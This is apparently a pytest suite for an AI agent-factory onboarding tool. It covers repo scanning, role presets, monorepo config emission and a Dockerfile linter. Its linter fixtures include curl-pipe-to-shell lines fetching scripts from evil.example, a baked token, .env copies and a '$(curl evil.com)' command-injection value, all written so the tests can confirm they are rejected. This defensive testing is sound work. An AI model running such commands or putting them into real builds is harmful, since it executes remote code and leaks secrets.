"""Tests for Wave 2: 80/20 lean onboarding, 1-Hub->N-Factories, Tier-A scanner, and 4-rule Dockerfile linter.

Verifies:
1. Universal <2s Tier-A scanner covers 5 canonical monorepo layouts (JS/TS, JVM, Go, Rust, Python),
   Git hosting tier (native_github vs best_effort), CI pointers, version pins, private registry paths,
   .env.example variable names without secret values, docker-compose/Testcontainers, all AI files,
   Day-0 skill name collision checks, Tier-C warnings, and ZERO jsonschema import on `scan`.
2. Streamlined 2-block /grill-me (4 PO + 4 Engineering questions) and lean 5-role default vs full
   agent-team roster preset with explicit tradeoff notes.
3. Single consolidated .factory/factory.yaml and monorepo .factory/<prefix>/factory.yaml coexistence
   (2 sibling factories in one repo without clobbering configs, briefs, or scoped AGENTS.md markers).
4. Anti-bloat AGENTS.md (<= 6 KB), zero 5 empty Day-0 Knowledge Plane placeholders, wave_0 folding,
   mandatory human confirmed_by provenance, and unified `factory_onboard.py validate`.
5. 4-rule deterministic Dockerfile linter (digest/BASE_IMAGE, non-root USER, zero curl|sh or secrets/.env,
   post-USER verify_binaries coverage) and backward-compatible parse_hub_project.py & generic_sandbox_gate.py.
"""
from __future__ import annotations

import importlib.util
import json
import pathlib
import subprocess
import sys

import yaml

from scripts.lib.dockerfile_recipes import validate_customer_dockerfile
from scripts.lib.onboard_emitter import emit_layer3_overlay
from scripts.lib.onboard_factory_v2 import AGENTS_MD_MAX_BYTES, validate_factory_repo
from scripts.lib.onboard_questions import build_draft_profile
from scripts.lib.onboard_roles import LEAN_CORE_ROLES, propose_roles
from scripts.lib.onboard_scanner import scan_repository_facts
from scripts.lib.onboard_tier_a import scan_tier_a_signals

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
ONBOARD_CLI = REPO_ROOT / "core-gcp-fde" / "scripts" / "factory_onboard.py"
PARSE_HUB_CLI = REPO_ROOT / "deploy" / "03-hub-bootstrap" / "parse_hub_project.py"
GENERIC_GATE = REPO_ROOT / "packs" / "generic" / "scripts" / "generic_sandbox_gate.py"
PROFILE_SCHEMA = REPO_ROOT / "schemas" / "factory-profile.schema.json"
PINNED_IMG = "us-central1-docker.pkg.dev/demo/repo/generic-antigravity-runtime@sha256:" + ("a" * 64)


def test_tier_a_five_monorepo_layouts_and_zero_secret_leaks(tmp_path: pathlib.Path) -> None:
    """Proves Tier-A detects all 5 canonical monorepo layouts, best_effort GitLab, Tier-C, collisions, and zero .env values."""
    repo = tmp_path / "polyglot-mono"
    (repo / ".git" / "refs" / "heads").mkdir(parents=True)
    (repo / ".git" / "config").write_text(
        '[remote "origin"]\n\turl = https://gitlab.corp.example/org/platform.git\n',
        encoding="utf-8",
    )
    (repo / ".git" / "refs" / "heads" / "main").write_text("0" * 40 + "\n", encoding="utf-8")
    (repo / ".git" / "refs" / "heads" / "develop").write_text("0" * 40 + "\n", encoding="utf-8")
    (repo / ".gitmodules").write_text('[submodule "sub"]\n\tpath = sub\n', encoding="utf-8")
    (repo / ".gitattributes").write_text("*.bin filter=lfs diff=lfs merge=lfs -text\n", encoding="utf-8")
    (repo / "pnpm-workspace.yaml").write_text("packages:\n  - 'apps/*'\n", encoding="utf-8")
    (repo / "settings.gradle.kts").write_text('include(":svc-a", ":svc-b")\n', encoding="utf-8")
    (repo / "go.work").write_text("go 1.23\nuse ./services/api\n", encoding="utf-8")
    (repo / "Cargo.toml").write_text('[workspace]\nmembers = ["crates/core"]\n', encoding="utf-8")
    (repo / "pyproject.toml").write_text('[tool.uv.workspace]\nmembers = ["libs/*"]\n', encoding="utf-8")
    (repo / ".nvmrc").write_text("22.11.0\n", encoding="utf-8")
    (repo / ".npmrc").write_text("//registry.internal/:_authToken=SUPER_SECRET_NEVER_LEAK\n", encoding="utf-8")
    (repo / ".env.example").write_text("DATABASE_URL=postgres://secret:pass@localhost/db\nAPI_KEY=dummy123\n", encoding="utf-8")
    (repo / "docker-compose.yml").write_text("services:\n  db:\n    image: postgres:16\n", encoding="utf-8")
    (repo / "WORKSPACE.bazel").write_text("# bazel\n", encoding="utf-8")
    (repo / "Jenkinsfile").write_text('@Library("shared-ci") _\npipeline {}\n', encoding="utf-8")
    (repo / ".cursor" / "rules").mkdir(parents=True)
    (repo / ".github" / "instructions").mkdir(parents=True)
    (repo / "apps" / "web").mkdir(parents=True)
    (repo / "apps" / "web" / "AGENTS.md").write_text("# Nested web rules\n", encoding="utf-8")
    (repo / ".claude" / "skills" / "gcp-fde-guardrails").mkdir(parents=True)
    (repo / ".claude" / "skills" / "gcp-fde-guardrails" / "SKILL.md").write_text("# shadow\n", encoding="utf-8")

    tier_a = scan_tier_a_signals(repo)
    assert set(tier_a["monorepo"]["layouts"]) == {"js-ts", "jvm", "go", "rust", "python"}
    assert tier_a["remote_host"] == "gitlab"
    assert tier_a["git_support_tier"] == "best_effort"
    assert tier_a["has_submodules"] is True
    assert tier_a["has_git_lfs"] is True
    assert tier_a["version_pins"]["node"] == "22.11.0"
    assert ".npmrc" in tier_a["private_registries"]
    assert tier_a["env_example_keys"] == ["API_KEY", "DATABASE_URL"]
    assert "SUPER_SECRET_NEVER_LEAK" not in json.dumps(tier_a)
    assert "postgres://secret" not in json.dumps(tier_a)
    assert "docker-compose.yml" in tier_a["local_services"]
    assert "apps/web/AGENTS.md" in tier_a["ai_files"]
    assert ".cursor/rules/" in tier_a["ai_files"]
    assert any("gcp-fde-guardrails" in c for c in tier_a["skill_collisions"])
    codes = {w["code"] for w in tier_a["tier_c_warnings"]}
    assert {"TIER_C_BAZEL", "TIER_C_JENKINS_SHARED_LIB"}.issubset(codes)


def test_scan_runs_without_jsonschema_dependency(tmp_path: pathlib.Path) -> None:
    """Proves factory_onboard.py scan runs cleanly even when jsonschema is absent from the Python environment."""
    repo = tmp_path / "bare-py"
    repo.mkdir()
    (repo / "pyproject.toml").write_text("[project]\nname = 'bare'\n", encoding="utf-8")

    runner = (
        "import sys; sys.meta_path.insert(0, type('Block', (), {"
        "'find_spec': lambda self, name, *a: (_ for _ in ()).throw(ImportError('blocked')) if name == 'jsonschema' else None"
        "})()); "
        f"sys.argv = ['factory_onboard.py', 'scan', '--repo', {str(repo)!r}, '--pack', 'generic']; "
        f"import runpy; runpy.run_path({str(ONBOARD_CLI)!r}, run_name='__main__')"
    )
    proc = subprocess.run([sys.executable, "-c", runner], capture_output=True, text=True, check=False)
    assert proc.returncode == 0, proc.stderr
    out = json.loads(proc.stdout)
    assert out["selected_pack"] == "generic"
    assert "tier_a" in out


def test_lean_5_role_default_vs_full_roster_preset_and_two_block_grill(tmp_path: pathlib.Path) -> None:
    """Confirms default lean preset yields 5 core roles, full yields complete SEP team, and /grill-me has 2 blocks."""
    repo = tmp_path / "web-app"
    repo.mkdir()
    (repo / "package.json").write_text(
        json.dumps({"dependencies": {"react": "^19.0.0"}, "scripts": {"test": "vitest", "lint": "eslint ."}}),
        encoding="utf-8",
    )
    scan_lean = scan_repository_facts(repo, pack="generic", roster_preset="lean")
    lean_enabled = {r["role"] for r in scan_lean["proposed_roles"]["enabled_roles"]}
    assert scan_lean["proposed_roles"]["preset"] == "lean"
    assert set(LEAN_CORE_ROLES).issubset(lean_enabled)
    assert "eng-manager" not in lean_enabled
    assert "architect" not in lean_enabled
    assert "Day 2" in scan_lean["proposed_roles"]["preset_tradeoff"]

    full_proposed = propose_roles(scan_lean, pack="generic", deploy_target="cloud-run", roster_preset="full")
    full_enabled = {r["role"] for r in full_proposed["enabled_roles"]}
    assert full_proposed["preset"] == "full"
    assert {"coordinator", "eng-manager", "architect", "web-builder", "generic-deployer", "qa-tester"}.issubset(full_enabled)
    assert "higher token cost" in full_proposed["preset_tradeoff"]

    blocks = {q["block"] for q in scan_lean["grill_questions"]}
    assert blocks == {"po", "engineering"}
    assert len(scan_lean["grill_questions"]) == 8
    q_ids = {q["id"] for q in scan_lean["grill_questions"]}
    assert {"mission_and_scope", "roster_preset", "commands_and_pyramid", "toolchain_and_dockerfile"}.issubset(q_ids)


def test_unified_factory_yaml_monorepo_coexistence_anti_bloat_and_validate(tmp_path: pathlib.Path) -> None:
    """Proves 2 sibling factories coexist in one monorepo (.factory/<prefix>/factory.yaml), zero empty Day-0 stubs, <=6KB AGENTS.md, and validate()."""
    repo = tmp_path / "mono-duo"
    (repo / "services" / "api").mkdir(parents=True)
    (repo / "apps" / "web").mkdir(parents=True)
    (repo / "pnpm-workspace.yaml").write_text("packages:\n  - 'apps/*'\n", encoding="utf-8")
    (repo / "services" / "api" / "go.mod").write_text("module example.com/api\ngo 1.23\n", encoding="utf-8")
    (repo / "apps" / "web" / "package.json").write_text('{"name":"web","scripts":{"test":"vitest"}}\n', encoding="utf-8")

    scan = scan_repository_facts(repo, pack="generic", roster_preset="lean")

    # Factory 1: api (lean preset, monorepo subdir services/api).
    draft_api = build_draft_profile(scan, pack="generic", roster_preset="lean", schema_version="2")
    draft_api.update({
        "slug": "mono-api",
        "confirmed_by": "Carlos Cabral",
        "deploy_target": "none",
        "mission": "Serve deterministic billing HTTP APIs in Go.",
        "non_goals": ["Never mutate legacy ERP tables directly."],
        "commands": {"build": "go build ./...", "lint": "go vet ./...", "test": "go test ./...", "e2e": ""},
        "invariants": ["Every HTTP handler must enforce caller auth before DB reads."],
        "monorepo": {"enabled": True, "tool": "pnpm-workspace", "subdir": "services/api", "agent_prefix": "api"},
        "missing_binaries": [],
        "heavy_test_binaries": [],
    })
    res_api = emit_layer3_overlay(repo, draft_api, PINNED_IMG, PROFILE_SCHEMA)
    assert res_api["config_path"] == ".factory/api/factory.yaml"
    assert (repo / ".factory" / "api" / "factory.yaml").is_file()
    assert (repo / ".factory" / "api" / "coordinator-bootstrap-brief.md").is_file()
    # Zero empty Day-0 Knowledge Plane placeholders and zero orphan modernization-backlog.yaml!
    assert not (repo / ".factory" / "modernization-backlog.yaml").exists()
    assert not (repo / ".factory" / "api" / "knowledge" / "glossary.md").exists()
    assert not (repo / ".factory" / "hub-project.yaml").exists()

    # Factory 2: web (full preset, monorepo subdir apps/web) on the SAME repo!
    draft_web = build_draft_profile(scan, pack="generic", roster_preset="full", schema_version="2")
    draft_web.update({
        "slug": "mono-web",
        "confirmed_by": "Ana Silva",
        "deploy_target": "none",
        "mission": "Render accessible React billing portal screens.",
        "non_goals": ["No direct backend SQL calls from frontend."],
        "commands": {"build": "", "lint": "echo ok", "test": "echo ok", "e2e": ""},
        "monorepo": {"enabled": True, "tool": "pnpm-workspace", "subdir": "apps/web", "agent_prefix": "web"},
        "missing_binaries": [],
        "heavy_test_binaries": [],
    })
    res_web = emit_layer3_overlay(repo, draft_web, PINNED_IMG, PROFILE_SCHEMA)
    assert res_web["config_path"] == ".factory/web/factory.yaml"

    # Both factories coexist in root AGENTS.md under distinct scoped markers and stay well under 6 KB.
    agents_txt = (repo / "AGENTS.md").read_text(encoding="utf-8")
    assert "<!-- gcp-fde-factory:api:start -->" in agents_txt
    assert "<!-- gcp-fde-factory:web:start -->" in agents_txt
    assert len(agents_txt.encode("utf-8")) < AGENTS_MD_MAX_BYTES

    # Unified validate() auto-discovers BOTH monorepo sibling configs without passing --config (M7).
    v_auto = validate_factory_repo(repo)
    assert v_auto["ok"] is True, v_auto
    assert isinstance(v_auto["config_path"], list) and len(v_auto["config_path"]) == 2
    # Non-colliding monorepo repo-conventions skill dirs and coordinator briefs (H3).
    assert (repo / "skills" / "mono-api-api-repo-conventions" / "SKILL.md").is_file()
    assert (repo / "skills" / "mono-web-web-repo-conventions" / "SKILL.md").is_file()

    # Large pre-existing customer AGENTS.md prose (>6 KB) emits a warning, NOT a hard error (M7),
    # whereas an oversized emitted factory block (>2 KB) or placeholder confirmed_by fails closed (M1).
    bad_cfg = yaml.safe_load((repo / ".factory" / "api" / "factory.yaml").read_text(encoding="utf-8"))
    bad_cfg["confirmed_by"] = "Claude"
    (repo / ".factory" / "api" / "factory.yaml").write_text(yaml.safe_dump(bad_cfg, sort_keys=False), encoding="utf-8")
    (repo / "AGENTS.md").write_text("# Legacy customer rules\n" + ("x" * 7000) + "\n" + agents_txt, encoding="utf-8")
    v_bad = validate_factory_repo(repo, config_path=pathlib.Path(".factory/api/factory.yaml"))
    assert v_bad["ok"] is False
    assert any("confirmed_by" in e for e in v_bad["errors"])
    assert any("Pre-existing customer AGENTS.md" in w for w in v_bad["warnings"])

    # Oversized factory overlay block (>2 KB) fails closed.
    bloated_block = (
        "<!-- gcp-fde-factory:api:start -->\n"
        + ("rule " * 500)
        + "\n<!-- gcp-fde-factory:api:end -->\n"
    )
    (repo / "AGENTS.md").write_text(bloated_block, encoding="utf-8")
    v_bloat = validate_factory_repo(repo, config_path=pathlib.Path(".factory/api/factory.yaml"))
    assert v_bloat["ok"] is False
    assert any("Emitted factory overlay" in e for e in v_bloat["errors"])

    # Path traversal via --config escapes repo and fails closed (M7).
    v_esc = validate_factory_repo(repo, config_path=pathlib.Path("/etc/hostname"))
    assert v_esc["ok"] is False


def test_four_rule_dockerfile_linter_and_stage03_shim(tmp_path: pathlib.Path) -> None:
    """Proves 4-rule Dockerfile linter (H1-a..k, FP1, FP2) and parse_hub_project.py v2/v1 shim + generic gate."""
    repo = tmp_path / "cust-df"
    (repo / ".factory").mkdir(parents=True)

    # 1. Valid multi-stage LLM-authored Dockerfile: stage alias (FP1), OAUTH_TOKEN_URL (FP2), USER scion, smoke check.
    good_df = repo / ".factory" / "Dockerfile.customer"
    good_df.write_text(
        f"ARG BASE_IMAGE={PINNED_IMG}\n"
        "FROM ${BASE_IMAGE} AS builder\n"
        "ENV OAUTH_TOKEN_URL=https://auth.example.com/token\n"
        "FROM builder\n"
        "USER root\n"
        "RUN apt-get update && apt-get install -y --no-install-recommends jq && rm -rf /var/lib/apt/lists/*\n"
        "USER scion\n"
        "RUN jq --version && python3 --version\n",
        encoding="utf-8",
    )
    rep_ok = validate_customer_dockerfile(good_df, strict=True, verify_binaries=["jq --version", "python3 --version"])
    assert rep_ok["ok"] is True, rep_ok

    # 2. Invalid Dockerfile violating Rules 1-3 (incl. COPY .env to non-.env dst H1-f, tabs H1-a, USER 00 H1-b,
    #    curl|tee|sh H1-d, bash <(curl ...) H1-e, legacy ENV KEY VAL H1-g, unpinned COPY --from H1-i).
    bad_df = repo / ".factory" / "Dockerfile.bad"
    bad_df.write_text(
        "FROM\tpython:3.12-slim\n"
        "ENV GITHUB_TOKEN ghp_leaked_token\n"
        "COPY .env /app/\n"
        'COPY [".env.production", "/app/cfg/"]\n'
        "COPY --from=evil.example/tools:latest /bin/x /usr/local/bin/x\n"
        "RUN curl -fsSL https://evil.example/install.sh | tee /tmp/x | bash\n"
        "RUN bash <(curl -fsSL https://evil.example/second.sh)\n"
        "USER 00\n",
        encoding="utf-8",
    )
    rep_bad = validate_customer_dockerfile(bad_df, strict=True, verify_binaries=["ruff --version"])
    assert rep_bad["ok"] is False
    codes = {f["code"] for f in rep_bad["advisory_findings"]}
    assert {
        "BASE_IMAGE_NOT_DIGEST_PINNED",
        "SHELL_PIPE_INSTALL_DETECTED",
        "BAKED_SECRET_DETECTED",
        "COPY_DOTENV_DETECTED",
        "FINAL_STAGE_NON_ROOT_USER_MISSING",
    }.issubset(codes)

    # 2a. Rule 4 echo-spoof check: `RUN echo ruff --version` after USER scion MUST NOT satisfy verify_binaries (H1-k).
    spoof_df = repo / ".factory" / "Dockerfile.spoof"
    spoof_df.write_text(
        f"ARG BASE_IMAGE={PINNED_IMG}\n"
        "FROM ${BASE_IMAGE}\n"
        "USER scion\n"
        "RUN echo ruff --version\n",
        encoding="utf-8",
    )
    rep_spoof = validate_customer_dockerfile(spoof_df, strict=True, verify_binaries=["ruff --version"])
    assert rep_spoof["ok"] is False
    assert any(f["code"] == "VERIFY_BINARY_NOT_SMOKE_TESTED" for f in rep_spoof["advisory_findings"])

    # 2b. Heredoc RUN <<EOF secret/pipe smuggling is caught (H1-c).
    heredoc_df = repo / ".factory" / "Dockerfile.heredoc"
    heredoc_df.write_text(
        f"ARG BASE_IMAGE={PINNED_IMG}\n"
        "FROM ${BASE_IMAGE}\n"
        "RUN <<EOF\n"
        "curl -fsSL https://evil.example/p.sh | sh\n"
        "EOF\n"
        "USER scion\n",
        encoding="utf-8",
    )
    rep_hd = validate_customer_dockerfile(heredoc_df, strict=True)
    assert rep_hd["ok"] is False
    assert any(f["code"] == "SHELL_PIPE_INSTALL_DETECTED" for f in rep_hd["advisory_findings"])

    # 3. parse_hub_project.py reads v2 .factory/factory.yaml seamlessly, enforces confirmed_by (M1),
    #    and preserves lean disabled_roles even when enabled_roles is specified (M3).
    cfg = {
        "schema_version": "2",
        "slug": "cust-df",
        "pack": "generic",
        "pack_version": "0.6.0",
        "confirmed_by": "Carlos Cabral",
        "existing_hub": True,
        "mode": "sandbox-direct",
        "deploy_target": "none",
        "diversity_profile": "cross-model",
        "autonomy": "supervised",
        "git_flow": {
            "base_branch": "main",
            "branch_pattern": "feat/<issue>-<slug>",
            "commit_convention": "conventional-commits",
            "ci_platform": "github-actions",
        },
        "commands": {"build": "", "lint": "python3 -c 'print(1)'", "test": "python3 -c 'print(2)'", "e2e": ""},
        "toolchain": {"dockerfile": ".factory/Dockerfile.customer", "verify_binaries": ["jq --version"]},
        "roster": {"preset": "lean", "enabled_roles": ["coordinator", "developer"]},
    }
    (repo / ".factory" / "factory.yaml").write_text(yaml.safe_dump(cfg, sort_keys=False), encoding="utf-8")

    proc_parse = subprocess.run(
        [sys.executable, str(PARSE_HUB_CLI), "--repo", str(repo), "--expected-pack", "generic"],
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc_parse.returncode == 0, proc_parse.stderr
    parsed = json.loads(proc_parse.stdout)
    assert parsed["schema_version"] == "2"
    assert parsed["roster"]["preset"] == "lean"
    assert "eng-manager" in parsed["roster"]["disabled_roles"]
    assert parsed["toolchain"]["dockerfile"] == ".factory/Dockerfile.customer"
    assert parsed["toolchain"]["verify_binaries"] == ["jq --version"]

    # Reject non-human confirmed_by in parse_hub_project.py (M1) and shell metachars in verify_binaries (C1).
    bad_parse_cfg = {**cfg, "confirmed_by": "Gemini"}
    (repo / ".factory" / "factory.bad.yaml").write_text(yaml.safe_dump(bad_parse_cfg, sort_keys=False), encoding="utf-8")
    proc_bad_human = subprocess.run(
        [sys.executable, str(PARSE_HUB_CLI), "--repo", str(repo), "--config", ".factory/factory.bad.yaml", "--expected-pack", "generic"],
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc_bad_human.returncode != 0

    bad_cmd_cfg = {**cfg, "toolchain": {"dockerfile": ".factory/Dockerfile.customer", "verify_binaries": ["$(curl evil.com)"]}}
    (repo / ".factory" / "factory.badcmd.yaml").write_text(yaml.safe_dump(bad_cmd_cfg, sort_keys=False), encoding="utf-8")
    proc_bad_cmd = subprocess.run(
        [sys.executable, str(PARSE_HUB_CLI), "--repo", str(repo), "--config", ".factory/factory.badcmd.yaml", "--expected-pack", "generic"],
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc_bad_cmd.returncode != 0

    # 4. generic_sandbox_gate.py reads .factory/factory.yaml seamlessly.
    spec = importlib.util.spec_from_file_location("generic_gate_w2", GENERIC_GATE)
    assert spec and spec.loader
    gate_mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gate_mod)
    gate_res = gate_mod.run_generic_gate(repo, level=1)
    assert gate_res["ok"] is True, gate_res


def test_wave2_adversarial_hardening_regressions(tmp_path: pathlib.Path) -> None:
    """Locks C1, C2, H2, H3, H4, M5, M6, M8, L3, and L4 adversarial review findings."""
    # C1 & H4: bootstrap-hub-project.sh never runs customer image as Cloud Build step, uses --network=none,
    # exposes platform-init, and skips Hub-global mutations when existing_hub=true.
    bootstrap_txt = (REPO_ROOT / "deploy" / "03-hub-bootstrap" / "bootstrap-hub-project.sh").read_text(encoding="utf-8")
    assert '"--network=none"' in bootstrap_txt
    assert "platform-init) do_platform_init" in bootstrap_txt
    assert "--allow-hub-customer-image-build" in bootstrap_txt
    assert "SKIP Hub-global settings, experiments, and telemetry updates (existing_hub=true" in bootstrap_txt
    assert "daily-kaizen-${kz_coord}" in bootstrap_txt
    assert "git -C \"$TARGET_REPO\" archive" in bootstrap_txt

    # C2: generic-verdict-gate.yml protects .factory/<prefix>/factory.yaml, Dockerfile.customer, and passes --config.
    wf_txt = (REPO_ROOT / "packs" / "generic" / "repo-scaffold" / ".github" / "workflows" / "generic-verdict-gate.yml").read_text(encoding="utf-8")
    assert "Dockerfile\\.customer" in wf_txt
    assert 'CFG_ARGS=(--config "$CFG_PATH")' in wf_txt
    assert "yaml.safe_load" in wf_txt

    # H2: coordinator and eng-manager templates reference harness_config_prefix and .factory/[<prefix>/]factory.yaml.
    coord_delta = (REPO_ROOT / "packs" / "generic" / "templates" / "coordinator" / "delta.md").read_text(encoding="utf-8")
    em_delta = (REPO_ROOT / "packs" / "generic" / "templates" / "eng-manager" / "delta.md").read_text(encoding="utf-8")
    assert "harness_config_prefix" in coord_delta
    assert "harness_config_prefix" in em_delta

    # L4 & M8: Tier-A rejects non-GitHub lookalike host and ignores symlinks pointing outside repo.
    repo = tmp_path / "hardening-repo"
    (repo / ".git").mkdir(parents=True)
    (repo / ".git" / "config").write_text(
        '[remote "origin"]\n\turl = https://github-mirror.gitlab.corp/org/app.git\n',
        encoding="utf-8",
    )
    outside = tmp_path / "outside-secret.env"
    outside.write_text("SECRET_OUTSIDE=do_not_read\n", encoding="utf-8")
    (repo / ".env.example").symlink_to(outside)
    tier_a = scan_tier_a_signals(repo)
    assert tier_a["git_support_tier"] == "best_effort"
    assert "SECRET_OUTSIDE" not in tier_a["env_example_keys"]

    # L3, M5, M6: Fence-aware AGENTS.md markers, recipe-derived verify_binaries, Day-2 override preservation,
    # and H3 duplicate monorepo prefix detection.
    (repo / "go.mod").write_text("module example.com/app\ngo 1.23\n", encoding="utf-8")
    (repo / "AGENTS.md").write_text(
        "# Docs\n```markdown\n<!-- gcp-fde-factory:start -->\nexample only\n<!-- gcp-fde-factory:end -->\n```\n",
        encoding="utf-8",
    )
    scan = scan_repository_facts(repo, pack="generic", roster_preset="lean")
    draft = build_draft_profile(scan, pack="generic", roster_preset="lean", schema_version="2")
    assert draft["existing_hub"] is False
    assert "go version" in draft["toolchain"]["verify_binaries"]

    draft.update({
        "slug": "hardening-app",
        "confirmed_by": "Carlos Cabral",
        "deploy_target": "none",
        "mission": "Serve verified HTTP endpoints.",
        "non_goals": ["No direct DB migrations."],
        "commands": {"build": "go build ./...", "lint": "go vet ./...", "test": "go test ./...", "e2e": ""},
        "monorepo": {"enabled": False, "tool": "none", "subdir": "", "agent_prefix": ""},
        "missing_binaries": [],
        "heavy_test_binaries": [],
        "toolchain": {"dockerfile": None, "tester_dockerfile": None, "verify_binaries": [], "pinned_image": None},
    })
    emit_layer3_overlay(repo, draft, PINNED_IMG, PROFILE_SCHEMA)
    # Code-fenced example markers remained intact while real markers were appended outside the fence (L3).
    agents_after = (repo / "AGENTS.md").read_text(encoding="utf-8")
    assert agents_after.count("<!-- gcp-fde-factory:start -->") == 2

    # Simulate Day-2 edit (kaizen.enabled=false) and verify re-emit preserves it (M6).
    cfg_path = repo / ".factory" / "factory.yaml"
    day2 = yaml.safe_load(cfg_path.read_text(encoding="utf-8"))
    day2["kaizen"]["enabled"] = False
    cfg_path.write_text(yaml.safe_dump(day2, sort_keys=False), encoding="utf-8")
    emit_layer3_overlay(repo, draft, PINNED_IMG, PROFILE_SCHEMA)
    re_emitted = yaml.safe_load(cfg_path.read_text(encoding="utf-8"))
    assert re_emitted["kaizen"]["enabled"] is False

    # H3: Duplicate monorepo.agent_prefix across siblings is caught by validate_factory_repo.
    mono_dup = tmp_path / "mono-dup"
    mono_dup.mkdir()
    (mono_dup / "AGENTS.md").write_text("# Root\n", encoding="utf-8")
    for sub in ("a", "b"):
        (mono_dup / ".factory" / sub).mkdir(parents=True)
        dup_cfg = {
            **re_emitted,
            "monorepo": {"enabled": True, "tool": "pnpm-workspace", "subdir": f"apps/{sub}", "agent_prefix": "same"},
            "kaizen": {**re_emitted["kaizen"], "coordinator_agent": "same-coordinator"},
            "overlay_skills": [{"dir": "skills/dup-repo-conventions", "version": "1.0.0"}],
        }
        (mono_dup / ".factory" / sub / "factory.yaml").write_text(yaml.safe_dump(dup_cfg, sort_keys=False), encoding="utf-8")
    v_dup = validate_factory_repo(mono_dup)
    assert v_dup["ok"] is False
    assert any("Duplicate monorepo.agent_prefix" in e for e in v_dup["errors"])
    assert any("Duplicate kaizen.coordinator_agent" in e for e in v_dup["errors"])
    assert any("Duplicate overlay_skills dir" in e for e in v_dup["errors"])
